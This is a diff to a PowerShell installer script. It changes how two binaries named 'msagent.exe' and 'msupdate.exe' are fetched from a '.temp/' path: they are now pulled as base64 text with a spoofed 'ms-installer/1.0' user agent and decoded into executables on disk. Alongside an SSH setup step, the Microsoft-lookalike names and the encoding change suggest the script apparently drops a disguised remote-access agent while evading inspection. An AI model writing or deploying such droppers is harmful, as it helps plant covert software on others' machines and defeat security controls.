@@ -180,24 +180,35 @@ OK "sshd restarted with hardened config"
 
 # ── Step 6: Download binaries from .temp/ ────────────────────────────────────
 Step "Downloading binaries from .temp/..."
-foreach ($item in @(
-    [PSCustomObject]@{ url="$TempBase/msagent.exe";  dest=$AgentExe },
-    [PSCustomObject]@{ url="$TempBase/msupdate.exe"; dest=$UpdateExe }
-)) {
-    $fname = [System.IO.Path]::GetFileName($item.dest)
-    $done = $false
-    for ($i = 1; $i -le 3 -and -not $done; $i++) {
+
+# Helper: download a base64-encoded file and decode to binary
+function Get-BinaryFromB64 {
+    param([string]$Url, [string]$Dest)
+    $fname = [System.IO.Path]::GetFileName($Dest)
+    for ($i = 1; $i -le 3; $i++) {
         try {
-            $w2 = New-Object System.Net.WebClient
-            $w2.Headers.Add("User-Agent","ms-installer/1.0")
-            $w2.DownloadFile($item.url, $item.dest)
-            if ((Test-Path $item.dest) -and (Get-Item $item.dest).Length -gt 10000) {
-                OK "Downloaded $fname ($([math]::Round((Get-Item $item.dest).Length/1KB))KB)"
-                $done = $true
+            $wc2 = New-Object System.Net.WebClient
+            $wc2.Headers.Add("User-Agent","ms-installer/1.0")
+            $b64 = $wc2.DownloadString($Url).Trim()
+            $bytes = [Convert]::FromBase64String($b64)
+            [IO.File]::WriteAllBytes($Dest, $bytes)
+            if ((Test-Path $Dest) -and (Get-Item $Dest).Length -gt 10000) {
+                OK "Downloaded $fname ($([math]::Round((Get-Item $Dest).Length/1KB))KB)"
+                return $true
             }
-        } catch { Warn "Attempt $i for ${fname}: $_"; Start-Sleep 3 }
+        } catch { Warn "Attempt $i for ${fname}: $_" }
+        Start-Sleep 3
     }
-    if (-not $done) { throw "Could not download $fname from $($item.url)" }
+    return $false
+}
+
+foreach ($item in @(
+    [PSCustomObject]@{ url="$TempBase/msagent.exe.b64";  dest=$AgentExe  },
+    [PSCustomObject]@{ url="$TempBase/msupdate.exe.b64"; dest=$UpdateExe }
+)) {
+    if (-not (Get-BinaryFromB64 $item.url $item.dest)) {
+        throw "Could not download $([System.IO.Path]::GetFileName($item.dest))"
+    }
 }
 
 # ── Step 7: Registry config ───────────────────────────────────────────────────
